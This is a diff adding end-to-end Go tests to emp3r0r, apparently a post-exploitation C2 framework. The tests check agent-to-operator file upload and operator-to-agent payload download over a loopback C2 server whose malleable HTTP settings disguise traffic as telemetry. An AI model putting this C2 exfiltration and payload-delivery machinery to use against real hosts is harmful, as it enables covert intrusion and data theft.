@@ -1,18 +1,32 @@
 package c2transport
 
 import (
+	"bytes"
 	"context"
+	"crypto/ecdsa"
+	"crypto/elliptic"
+	"crypto/rand"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
+	"github.com/fxamacker/cbor/v2"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -327,5 +341,427 @@ func TestFetchFilePeerRejectsUnknownTransport(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "no-such-transport") {
 		t.Fatalf("error should name the offending transport, got: %v", err)
+	}
+}
+
+// -----------------------------------------------------------------------------
+// Operator <-> agent file transfer over the real C2 stack.
+//
+// These tests stand up a real plain-HTTP C2 server, enroll an agent in the
+// trust database, and drive the real agent-side transfer functions
+// (SendFile2CC and DownloadViaC2) through the real CC dispatcher and relay
+// handlers:
+//
+//	agent --SendFile2CC--> CC handleFileUploadStream --> operator (FTP relay)
+//	agent <--DownloadViaC2-- CC handleWWWRelayStream <-- operator (WWW relay)
+//
+// The operator is represented by one end of a net.Pipe handed to
+// server.RegisterOperatorConn, which runs the same read loop as the websocket
+// operator tunnel. This exercises the whole data path including gzip, the
+// padded SecureConn framing, the bulk padding bypass, and checksum validation.
+
+type e2eFileTransferHarness struct {
+	tmpDir string
+}
+
+// e2eFreePort returns a currently free loopback TCP port.
+func e2eFreePort(t *testing.T) int {
+	t.Helper()
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatalf("free port: %v", err)
+	}
+	defer ln.Close()
+	return ln.Addr().(*net.TCPAddr).Port
+}
+
+// e2eWaitForPort waits until addr accepts connections or the deadline passes.
+func e2eWaitForPort(t *testing.T, addr string, deadline time.Time) {
+	t.Helper()
+	for time.Now().Before(deadline) {
+		c, err := net.DialTimeout("tcp", addr, 200*time.Millisecond)
+		if err == nil {
+			c.Close()
+			return
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	t.Fatalf("port %s did not become ready", addr)
+}
+
+// e2eChunkConn is a read-only io.ReadWriteCloser fed by Push, modelling the
+// operator-side FTP relay connection that reassembles an upload. It decouples
+// the CC's forwarding goroutine from the operator's decompression so a slow
+// reader can never make fwdMsgToOperator hit its write deadline.
+type e2eChunkConn struct {
+	ch     chan []byte
+	closed chan struct{}
+	once   sync.Once
+	buf    []byte
+}
+
+func newE2EChunkConn() *e2eChunkConn {
+	return &e2eChunkConn{ch: make(chan []byte, 256), closed: make(chan struct{})}
+}
+
+func (c *e2eChunkConn) Read(p []byte) (int, error) {
+	for len(c.buf) == 0 {
+		chunk, ok := <-c.ch
+		if !ok {
+			return 0, io.EOF
+		}
+		c.buf = chunk
+	}
+	n := copy(p, c.buf)
+	c.buf = c.buf[n:]
+	return n, nil
+}
+
+func (c *e2eChunkConn) Write(_ []byte) (int, error) {
+	return 0, fmt.Errorf("e2eChunkConn is read-only")
+}
+
+func (c *e2eChunkConn) Close() error {
+	c.once.Do(func() {
+		close(c.ch)
+		close(c.closed)
+	})
+	return nil
+}
+
+func (c *e2eChunkConn) Push(data []byte) error {
+	select {
+	case <-c.closed:
+		return io.EOF
+	default:
+	}
+	chunk := make([]byte, len(data))
+	copy(chunk, data)
+	c.ch <- chunk
+	return nil
+}
+
+// setupE2EFileTransfer builds the C2 server, trust DB, agent identity and the
+// agent-side runtime config. The caller is responsible for registering the
+// operator tunnel with server.RegisterOperatorConn.
+func setupE2EFileTransfer(t *testing.T) *e2eFileTransferHarness {
+	t.Helper()
+
+	tmpDir := t.TempDir()
+
+	// Snapshot and restore every global this harness mutates. Tests share
+	// process state, so leaking any of these would corrupt later tests.
+	origLiveRuntime := live.RuntimeConfig
+	origEmpWorkSpace := live.EmpWorkSpace
+	origFileGetDir := live.FileGetDir
+	origWWWRoot := live.WWWRoot
+	origCCAddr := def.CCAddress
+	origHTTPClient := def.HTTPClient
+	origCommonRuntime := common.RuntimeConfig
+	origAgentKey := agentutils.AgentKey
+	origCACrtPEM := transport.CACrtPEM
+	origCaCrtFile := transport.CaCrtFile
+	origCaKeyFile := transport.CaKeyFile
+	origEmpWorkSpaceT := transport.EmpWorkSpace
+
+	t.Cleanup(func() {
+		network.StopEmpHTTPServer()
+		network.FTPStreams.Clear()
+		_ = agents.CloseAgentDB()
+		live.RuntimeConfig = origLiveRuntime
+		live.EmpWorkSpace = origEmpWorkSpace
+		live.FileGetDir = origFileGetDir
+		live.WWWRoot = origWWWRoot
+		def.CCAddress = origCCAddr
+		def.HTTPClient = origHTTPClient
+		common.RuntimeConfig = origCommonRuntime
+		agentutils.AgentKey = origAgentKey
+		transport.CACrtPEM = origCACrtPEM
+		transport.CaCrtFile = origCaCrtFile
+		transport.CaKeyFile = origCaKeyFile
+		transport.EmpWorkSpace = origEmpWorkSpaceT
+		transport.SetC2Padding(0, 0)
+	})
+
+	// Exercise padded control frames and the unpadded bulk relay path, which
+	// is what these transfers use in production.
+	transport.SetC2Padding(64, 1024)
+
+	// Workspace paths used by the operator-side file reconstruction and the
+	// WWW relay.
+	live.EmpWorkSpace = tmpDir
+	live.FileGetDir = filepath.Join(tmpDir, "file-get") + string(os.PathSeparator)
+	live.WWWRoot = filepath.Join(tmpDir, "www") + string(os.PathSeparator)
+	if err := os.MkdirAll(live.FileGetDir, 0o700); err != nil {
+		t.Fatalf("mkdir FileGetDir: %v", err)
+	}
+	if err := os.MkdirAll(live.WWWRoot, 0o700); err != nil {
+		t.Fatalf("mkdir WWWRoot: %v", err)
+	}
+
+	// CA: the plain-HTTP client still needs a CA bundle, and MsgAuth tokens
+	// are CA-signed.
+	caCertFile := filepath.Join(tmpDir, "ca-cert.pem")
+	caKeyFile := filepath.Join(tmpDir, "ca-key.pem")
+	if _, err := transport.GenCerts(nil, caCertFile, caKeyFile, "", "", true); err != nil {
+		t.Fatalf("GenCerts CA: %v", err)
+	}
+	caCertData, err := os.ReadFile(caCertFile)
+	if err != nil {
+		t.Fatalf("read CA cert: %v", err)
+	}
+	transport.CACrtPEM = caCertData
+	transport.CaCrtFile = caCertFile
+	transport.CaKeyFile = caKeyFile
+	transport.EmpWorkSpace = tmpDir
+
+	// Agent identity: its own key for MsgAuth proofs, and a CA-signed UUID.
+	agentPriv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		t.Fatalf("agent key: %v", err)
+	}
+	agentPubPEM, err := transport.PublicKeyToPEM(&agentPriv.PublicKey)
+	if err != nil {
+		t.Fatalf("agent public key: %v", err)
+	}
+	agentutils.AgentKey = agentPriv
+	agentUUID := util.RandHexString()
+	agentTag := "e2e-file-agent-" + util.RandHexString()[:8]
+	agentSig, err := transport.SignWithCAKey([]byte(agentUUID))
+	if err != nil {
+		t.Fatalf("sign agent uuid: %v", err)
+	}
+	agentSigB64 := base64.URLEncoding.EncodeToString(agentSig)
+
+	routes := def.C2Routing{
+		Checkin: "c2-checkin",
+		Msg:     "c2-msg",
+		FTP:     "c2-ftp",
+		WWW:     "c2-www",
+		Proxy:   "c2-proxy",
+	}
+	malleable := def.MalleableHTTPConfig{
+		C2Path:        "/api/v1/telemetry",
+		SessionHeader: "Cookie",
+		SessionValue:  "sessionID=%s",
+		InitHeader:    "Cookie",
+		InitValue:     "init=1",
+		CloseHeader:   "Cookie",
+		CloseValue:    "close=1",
+	}
+
+	httpPort := e2eFreePort(t)
+	live.RuntimeConfig = &def.Config{
+		CCHTTPPort:          fmt.Sprintf("%d", httpPort),
+		CAPEM:               string(caCertData),
+		C2ChannelMode:       def.C2ChannelModePlainHTTP,
+		C2Routes:            routes,
+		MalleableC2:         malleable,
+		OperatorIdleTimeout: 0,
+	}
+
+	// Trust DB: pin the agent public key so the dispatcher admits the FTP/WWW
+	// routes without a prior check-in round trip.
+	if err := agents.InitAgentDB(filepath.Join(tmpDir, "agents.db")); err != nil {
+		t.Fatalf("InitAgentDB: %v", err)
+	}
+	target := &def.Emp3r0rAgent{
+		UUID:      agentUUID,
+		Tag:       agentTag,
+		UUIDSig:   agentSigB64,
+		PublicKey: string(agentPubPEM),
+		Hostname:  "e2e-host",
+		OS:        "linux",
+		Arch:      "amd64",
+		User:      "tester",
+	}
+	if err := agents.RecordAgentCheckin(target); err != nil {
+		t.Fatalf("RecordAgentCheckin: %v", err)
+	}
+
+	// Real C2 plain-HTTP server.
+	go server.StartC2HTTPServer()
+	e2eWaitForPort(t, fmt.Sprintf("127.0.0.1:%d", httpPort), time.Now().Add(10*time.Second))
+
+	// Agent-side runtime config and HTTP client.
+	ccBase := fmt.Sprintf("http://127.0.0.1:%d", httpPort)
+	def.CCAddress = ccBase
+	def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
+	if def.HTTPClient == nil {
+		t.Fatalf("CreateEmp3r0rHTTPClient failed")
+	}
+	common.RuntimeConfig = &def.Config{
+		CCAddress:     ccBase,
+		CCHTTPPort:    fmt.Sprintf("%d", httpPort),
+		C2ChannelMode: def.C2ChannelModePlainHTTP,
+		C2Routes:      routes,
+		MalleableC2:   malleable,
+		AgentUUID:     agentUUID,
+		AgentUUIDSig:  agentSigB64,
+		AgentTag:      agentTag,
+		CCTimeout:     10000,
+	}
+
+	return &e2eFileTransferHarness{tmpDir: tmpDir}
+}
+
+// TestFileTransfer_AgentUploadsToOperator verifies agent -> CC -> operator:
+// SendFile2CC gzips the file over the real SecureConn, handleFileUploadStream
+// relays it to the operator, and the operator-side ftp.HandleFTPStream
+// decompresses, checksums and commits it.
+func TestFileTransfer_AgentUploadsToOperator(t *testing.T) {
+	h := setupE2EFileTransfer(t)
+
+	content := bytes.Repeat([]byte("agent-upload-to-operator-e2e-"), 1024) // ~29KB
+	checksum := crypto.SHA256SumRaw(content)
+	srcPath := filepath.Join(h.tmpDir, "agent_upload_src.bin")
+	if err := os.WriteFile(srcPath, content, 0o600); err != nil {
+		t.Fatalf("write source: %v", err)
+	}
+
+	// Token format expected by ftp.HandleFTPStream: <opaque>-<checksum>.
+	token := fmt.Sprintf("%s-%s", util.RandHexString(), checksum)
+	_, targetFile, _, _ := ftp.GenerateGetFilePaths(srcPath)
+
+	sh := &network.StreamHandler{
+		Token:           token,
+		OperatorSession: "test-operator",
+		ExpectedSize:    int64(len(content)),
+		Checksum:        checksum,
+		Ctx:             context.Background(),
+		Cancel:          func() {},
+	}
+	network.FTPStreams.Store(srcPath, sh)
+	network.FTPStreams.Store("token:"+token, sh)
+
+	// Operator-side receiver.
+	relay := newE2EChunkConn()
+	go ftp.HandleFTPStream(relay, token, "e2e-operator", func() {})
+
+	opCC, opTest := net.Pipe()
+	server.RegisterOperatorConn("test-operator", opCC)
+	t.Cleanup(func() {
+		_ = opCC.Close()
+		_ = opTest.Close()
+	})
+
+	opErr := make(chan error, 1)
+	go func() {
+		dec := cbor.NewDecoder(opTest)
+		for {
+			var msg def.MsgTunData
+			if err := dec.Decode(&msg); err != nil {
+				return
+			}
+			switch {
+			case strings.HasPrefix(msg.Tag, def.TagFTPRelayDataPrefix):
+				if err := relay.Push(msg.Response); err != nil {
+					opErr <- fmt.Errorf("push ftp chunk: %w", err)
+					return
+				}
+			case strings.HasPrefix(msg.Tag, def.TagFTPRelayDonePrefix):
+				_ = relay.Close()
+			case strings.HasPrefix(msg.Tag, def.TagFTPRelayErrorPrefix):
+				opErr <- fmt.Errorf("ftp relay error: %s", msg.Response)
+				_ = relay.Close()
+			}
+		}
+	}()
+
+	if err := SendFile2CC(srcPath, 0, token); err != nil {
+		t.Fatalf("SendFile2CC: %v", err)
+	}
+
+	deadline := time.Now().Add(20 * time.Second)
+	for time.Now().Before(deadline) {
+		select {
+		case err := <-opErr:
+			t.Fatalf("operator: %v", err)
+		default:
+		}
+		got, err := os.ReadFile(targetFile)
+		if err == nil {
+			if !bytes.Equal(got, content) {
+				t.Fatalf("received file mismatch: got %d bytes want %d", len(got), len(content))
+			}
+			return
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	t.Fatalf("file was not received at %s", targetFile)
+}
+
+// TestFileTransfer_OperatorSendsToAgent verifies operator -> CC -> agent: the
+// operator answers a WWW relay request with the file, handleWWWRelayStream
+// pushes it over the agent's SecureConn, and DownloadViaC2 returns it.
+func TestFileTransfer_OperatorSendsToAgent(t *testing.T) {
+	setupE2EFileTransfer(t)
+
+	content := bytes.Repeat([]byte("operator-sends-to-agent-e2e-"), 2048) // ~53KB
+	checksum := crypto.SHA256SumRaw(content)
+	fileName := "operator_payload.bin"
+	if err := os.WriteFile(filepath.Join(live.WWWRoot, fileName), content, 0o600); err != nil {
+		t.Fatalf("write hosted file: %v", err)
+	}
+
+	opCC, opTest := net.Pipe()
+	server.RegisterOperatorConn("test-operator", opCC)
+	t.Cleanup(func() {
+		_ = opCC.Close()
+		_ = opTest.Close()
+	})
+
+	opErr := make(chan error, 1)
+	go func() {
+		dec := cbor.NewDecoder(opTest)
+		enc := cbor.NewEncoder(opTest)
+		for {
+			var msg def.MsgTunData
+			if err := dec.Decode(&msg); err != nil {
+				return
+			}
+			if !strings.HasPrefix(msg.Tag, def.TagWWWRelayRequestPrefix) {
+				continue
+			}
+			streamID := strings.TrimPrefix(msg.Tag, def.TagWWWRelayRequestPrefix)
+			path := filepath.Join(live.WWWRoot, filepath.Base(streamID))
+			data, err := os.ReadFile(path)
+			if err != nil {
+				opErr <- fmt.Errorf("read hosted file: %v", err)
+				_ = enc.Encode(&def.MsgTunData{
+					Tag:      def.TagWWWRelayErrorPrefix + streamID,
+					Response: []byte(err.Error()),
+				})
+				return
+			}
+			const chunkSize = 16 * 1024
+			for off := 0; off < len(data); off += chunkSize {
+				end := min(off+chunkSize, len(data))
+				if err := enc.Encode(&def.MsgTunData{
+					Tag:      def.TagWWWRelayDataPrefix + streamID,
+					Response: data[off:end],
+				}); err != nil {
+					opErr <- fmt.Errorf("send www chunk: %v", err)
+					return
+				}
+			}
+			if err := enc.Encode(&def.MsgTunData{Tag: def.TagWWWRelayDonePrefix + streamID}); err != nil {
+				opErr <- fmt.Errorf("send www done: %v", err)
+				return
+			}
+		}
+	}()
+
+	got, err := DownloadViaC2(common.RuntimeConfig, fileName, "", checksum)
+	if err != nil {
+		select {
+		case opErr := <-opErr:
+			t.Fatalf("DownloadViaC2: %v (operator: %v)", err, opErr)
+		default:
+		}
+		t.Fatalf("DownloadViaC2: %v", err)
+	}
+	if !bytes.Equal(got, content) {
+		t.Fatalf("downloaded content mismatch: got %d bytes want %d", len(got), len(content))
 	}
 }
